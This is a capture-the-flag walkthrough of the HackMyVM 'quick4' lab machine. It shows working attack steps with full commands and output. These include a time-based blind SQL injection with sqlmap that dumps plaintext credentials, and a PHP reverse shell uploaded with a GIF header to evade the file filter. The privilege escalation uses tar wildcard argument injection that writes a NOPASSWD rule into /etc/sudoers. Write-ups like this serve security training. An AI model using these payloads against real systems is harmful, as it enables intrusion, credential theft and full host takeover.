# quick4

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| quick4 | eMVee | Beginner | HackMyVM |

**Summary:** The exploitation of the Quick4 machine begins with an exhaustive network discovery phase that reveals an exposed web service and a hidden administrative area mentioned in the robots.txt file. Initial vulnerability research identifies a critical time based blind SQL injection vulnerability within the employee login portal, allowing for the complete extraction of the backend database including sensitive user credentials and profile information. By leveraging the discovered credentials, access is gained to an employee profile where a file upload feature is abused to upload a PHP reverse shell disguised with a GIF header to bypass security filters. After establishing a stable foothold as the www-data user, internal enumeration reveals a root cronjob executing a backup script using the tar command with a wildcard character. This configuration is susceptible to a wildcard expansion attack, where specifically named files are interpreted as command line arguments by tar, leading to arbitrary command execution as the root user and final system compromise.

---

**Reconnaissance**

The initial phase of the engagement focuses on identifying active hosts within the network. A standard Nmap ping scan is executed to map the 192.168.100.0/24 subnet.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ nmap -sn -PR 192.168.100.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-20 11:44 WIB
Nmap scan report for CLIENT-DESKTOP (192.168.100.1)
Host is up (0.0021s latency).
Nmap scan report for 192.168.100.2
Host is up (0.00062s latency).
Nmap scan report for 192.168.100.203
Host is up (0.0065s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.09 seconds
```

Upon identifying the target at 192.168.100.203, a comprehensive port scan is performed to enumerate all open services and their versions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ nmap -sCV -p- -T4 192.168.100.203
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-20 11:45 WIB
Nmap scan report for 192.168.100.203
Host is up (0.0021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Quick Automative - Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.46 seconds
```

The scan results reveal an HTTP service on port 80 and SSH on port 22. Interestingly, the robots.txt file points to an /admin/ directory. To find more hidden paths, Gobuster is used for directory brute forcing.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ gobuster dir -u http://192.168.100.203/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.203/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://192.168.100.203/images/]
/index.html           (Status: 200) [Size: 51414]
/img                  (Status: 301) [Size: 316] [--> http://192.168.100.203/img/]
/modules              (Status: 301) [Size: 320] [--> http://192.168.100.203/modules/]
/careers              (Status: 301) [Size: 320] [--> http://192.168.100.203/careers/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.100.203/css/]
/lib                  (Status: 301) [Size: 316] [--> http://192.168.100.203/lib/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.100.203/js/]
/customer             (Status: 301) [Size: 321] [--> http://192.168.100.203/customer/]
/404.html             (Status: 200) [Size: 5014]
/robots.txt           (Status: 200) [Size: 32]
/fonts                (Status: 301) [Size: 318] [--> http://192.168.100.203/fonts/]
/employee             (Status: 301) [Size: 321] [--> http://192.168.100.203/employee/]
/server-status        (Status: 403) [Size: 280]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

**Vulnerability Discovery**

The exploration of the /employee/ directory leads to a login form. An attempt to intercept and analyze the POST request is made to check for potential injection vulnerabilities.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ cat req.txt
POST /employee/ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: id,en-US;q=0.9,en;q=0.8,id-ID;q=0.7,la;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Host: 192.168.100.203
Origin: http://192.168.100.203
Referer: http://192.168.100.203/employee/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

email=test%40test.com&password=qwertyuiop&submit=Login
```

The sqlmap tool is utilized to test the email parameter for SQL injection. The results confirm a time based blind injection point.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ sqlmap -r req.txt --dbs --batch -v 0
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:27:34 /2026-05-20/

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 7521 FROM (SELECT(SLEEP(5)))RTvI) AND 'esGq'='esGq&password=qwertyuiop&submit=Login
---
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
available databases [5]:
[*] `quick`
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys


[*] ending @ 19:27:34 /2026-05-20/
```

Further enumeration of the 'quick' database reveals two tables: cars and users.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ sqlmap -r req.txt -D 'quick' --tables --batch -v 0
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:27:50 /2026-05-20/

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 7521 FROM (SELECT(SLEEP(5)))RTvI) AND 'esGq'='esGq&password=qwertyuiop&submit=Login
---
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
Database: quick
[2 tables]
+-------+
| cars  |
| users |
+-------+


[*] ending @ 19:27:50 /2026-05-20/
```

Dumping the users table provides a wealth of information, including plaintext passwords and paths to profile pictures in an uploads directory.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ sqlmap -r req.txt -D 'quick' -T users --dump --batch -v 0
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:27:57 /2026-05-20/

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 7521 FROM (SELECT(SLEEP(5)))RTvI) AND 'esGq'='esGq&password=qwertyuiop&submit=Login
---
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[19:27:57] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
Database: quick
Table: users
[28 entries]
+----+-----------------------------------+-----------------+----------+--------------------+----------------------+
| id | email                             | name            | role     | password           | profile_picture      |
+----+-----------------------------------+-----------------+----------+--------------------+----------------------+
| 1  | info@quick.hmv                    | Quick           | admin    | Qe62W064sgRTdxAEpr | uploads/1_admin.png  |
| 2  | nick.greenhorn@quick.hmv          | Nick Greenhorn  | employee | C3ho049g4kwxTxuSUA | uploads/2_admin.png  |
| 3  | andrew.speed@quick.hmv            | Andrew Speed    | employee | o30VfVgts73ibSboUP | uploads/3_andrew.jpg |
| 4  | jack.black@email.hmv              | Jack Black      | customer | 1Wd35lRnAKMGMEwcsX | <blank>              |
| 5  | mike.cooper@quick.hmv             | Mike Cooper     | employee | Rh978db3URen64yaPP | uploads/5_mike.jpg   |
| 6  | j.doe@email.hmv                   | John Doe        | customer | 0i3a8KyWS2IcbmqF02 | <blank>              |
| 7  | jane_smith@email.hmv              | Jane Smith      | customer | pL2a92Po2ykXytzX7y | <blank>              |
| 8  | frank@email.hmv                   | Frank Stein     | customer | 155HseB7sQzIpE2dIG | <blank>              |
| 9  | fred.flinstone@email.hmv          | Fred Flinstone  | customer | qM51130xeGHHxKZWqk | <blank>              |
| 10 | s.hutson@email.hmv                | Sandra Hutson   | customer | sF217VruHNj6wbjofU | <blank>              |
| 11 | b.clintwood@email.hmv             | Bill Clintwood  | customer | 2yLw53N0m08OhFyBXx | <blank>              |
| 12 | j.bond@email.hmv                  | James Bond      | customer | 7wS93MQPiVQUkqfQ5T | <blank>              |
| 13 | d.trumpet@email.hmv               | Donald Trumpet  | customer | f64KBw7cGvu1BkVwcb | <blank>              |
| 14 | m.monroe@email.hmv                | Michelle Monroe | customer | f64KBw7cGvu1BkVwcb | <blank>              |
| 15 | jeff.anderson@quick.hmv           | Jeff Anderson   | employee | 5dX3g8hnKo7AFNHXTV | uploads/15_jeff.jpg  |
| 16 | lee.ka-shingn@quick.hmv@quick.hmv | Lee Ka-shing    | employee | am636X6Rh1u6S8WNr4 | uploads/16_lee.jpg   |
| 17 | laura.johnson@email.hmv           | Laura Johnson   | customer | 95T3OmjOV3gublmR7Z | <blank>              |
| 18 | coos.busters@quick.hmv            | Coos Busters    | employee | f1CD3u3XVo0uXumGah | uploads/18_coos.jpg  |
| 19 | n.down@email.hmv                  | Neil Down       | customer | Lj9Wr562vqNuLlkTr0 | <blank>              |
| 20 | t.green@email.hmv                 | Teresa Green    | customer | 7zQ19L0HhFsivH3zFi | <blank>              |
| 21 | k.ball@email.hmv                  | Krystal Ball    | customer | k1TI68MmYu8uQHhfS1 | <blank>              |
| 22 | juan.mecanico@quick.hmv           | Juan Mecánico   | employee | 5a34pXYDAOUMZCoPrg | uploads/22_juan.jpg  |
| 23 | john.smith@quick.hmv              | John Smith      | employee | 5Wqio90BLd7i4oBMXJ | uploads/23_john.jpg  |
| 24 | misty.cupp@email.hmv              | Misty Cupp      | customer | c1P35bcdw0mF3ExJXG | <blank>              |
| 25 | lara.johnson@quick.hmv            | Lara Johnson    | employee | 5Y7zypv8tl9N7TeCFp | uploads/25_lara.jpg  |
| 26 | j.daniels@email.hmv               | James Daniels   | customer | yF891teFhjhj0Rg7ds | <blank>              |
| 27 | dick_swett@email.hmv              | Dick Swett      | customer | y6KA4378EbK0ePv5XN | <blank>              |
| 28 | a.lucky@email.hmv                 | Anna Lucky      | customer | c1P35bcdw0mF3ExJXG | <blank>              |
+----+-----------------------------------+-----------------+----------+--------------------+----------------------+


[*] ending @ 19:27:58 /2026-05-20/
```

**Initial Access**

The existence of an uploads directory suggests a potential for remote code execution via file upload. A PHP reverse shell is prepared, prepending the magic bytes for a GIF file to bypass possible file type checks.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ vim php-reverse-shell.php

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ head -n 5 php-reverse-shell.php
GIF89a
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ mv php-reverse-shell.php shell.php
```

The shell is uploaded through the profile update page of an employee account, such as Nick Greenhorn.

![](image.png)

A Netcat listener is established on the local machine to catch the incoming connection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

After logging in as Nick Greenhorn, the application reveals the renamed file path for the uploaded profile picture.

![](image-1.png)

Navigating to the newly created file triggers the reverse shell execution.

![](image-2.png)

The connection is received, and the shell is upgraded to a full interactive TTY for better stability.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 54076
Linux quick4 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 12:51:47 up  8:12,  0 users,  load average: 0.36, 0.35, 0.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which script
/usr/bin/script
$ script -qc /bin/bash /dev/null
www-data@quick4:/$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick4]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@quick4:/$ export SHELL=/bin/bash
www-data@quick4:/$ export TERM=xterm
www-data@quick4:/$ stty rows 75 cols 100
```

Initial system enumeration shows several user home directories, but access is restricted.

```bash
www-data@quick4:/$ ls -la /home
total 52
drwxr-xr-x 11 root   root   4096 Feb  8  2024 .
drwxr-xr-x 20 root   root   4096 Jan 14  2024 ..
drwxr-x---  4 andrew andrew 4096 Jan 24  2024 andrew
drwxr-x---  2 coos   coos   4096 Feb  8  2024 coos
drwxr-x---  2 jeff   jeff   4096 Jan 24  2024 jeff
drwxr-x---  2 john   john   4096 Jan 24  2024 john
drwxr-x---  2 juan   juan   4096 Jan 24  2024 juan
drwxr-x---  2 lara   lara   4096 Jan 24  2024 lara
drwxr-x---  2 lee    lee    4096 Jan 24  2024 lee
drwxr-x---  4 mike   mike   4096 Jan 24  2024 mike
drwxr-x---  3 nick   nick   4096 Jan 14  2024 nick
-rw-rw-r--  1 root   root   7861 Feb  8  2024 user.txt
```

**Privilege Escalation**

The system crontab is inspected for scheduled tasks that might be running with elevated privileges.

```bash
www-data@quick4:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*/1 *   * * *   root    /usr/local/bin/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

A backup script is found running as root every minute. The script contents reveal a dangerous use of the tar wildcard operator.

```bash
www-data@quick4:/tmp$ ls -la /usr/local/bin/backup.sh
-rwxr--r-- 1 root root 75 Feb 12  2024 /usr/local/bin/backup.sh
www-data@quick4:/tmp$ cat /usr/local/bin/backup.sh
#!/bin/bash
cd /var/www/html/
tar czf /var/backups/backup-website.tar.gz *
```

Because the tar command uses an asterisk to include all files in the current directory, it is vulnerable to command injection via specially crafted filenames. An exploit script is created to modify the sudoers file and change the www-data password.

```bash
www-data@quick4:/tmp$ cd /var/www/html/
www-data@quick4:/var/www/html$ echo -e 'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\necho "www-data:pwned" | chpasswd' > exploit.sh
www-data@quick4:/var/www/html$ cat exploit.sh
echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "www-data:pwned" | chpasswd
www-data@quick4:/var/www/html$ chmod +x exploit.sh
```

The necessary files are created to trigger the tar checkpoint action when the cronjob executes.

```bash
www-data@quick4:/var/www/html$ touch -- "--checkpoint=1"
www-data@quick4:/var/www/html$ touch -- "--checkpoint-action=exec=sh exploit.sh"
```

After waiting for the cronjob to run, the www-data user now has full sudo permissions without a password.

```bash
www-data@quick4:/var/www/html$ sudo -l
Matching Defaults entries for www-data on quick4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on quick4:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```

Root access is obtained by switching to the root user, and the final flags are retrieved.

```bash
www-data@quick4:/var/www/html$ sudo -i
root@quick4:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
quick4
root@quick4:~# grep -rni "HMV{" /home /root 2>/dev/null
/home/mike/user.txt:51:                         HMV{717[REDACTED]}
/home/user.txt:51:                                                            HMV{792[REDACTED]}
/root/root.txt:53:                                                            HMV{858[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Network scanning and directory enumeration identify an HTTP service with an exposed /employee/ login portal.
2. **Vulnerability Discovery**: Time based blind SQL injection is discovered and exploited on the login form to dump the backend database.
3. **Exploitation**: Credentials from the database dump are used to access an employee account where a PHP reverse shell is uploaded via a bypassed file upload mechanism.
4. **Internal Enumeration**: Analysis of the system crontab reveals a root owned backup script utilizing the tar command with a wildcard.
5. **Privilege Escalation**: A tar wildcard expansion attack is executed to gain full administrative control and retrieve the final system flags.

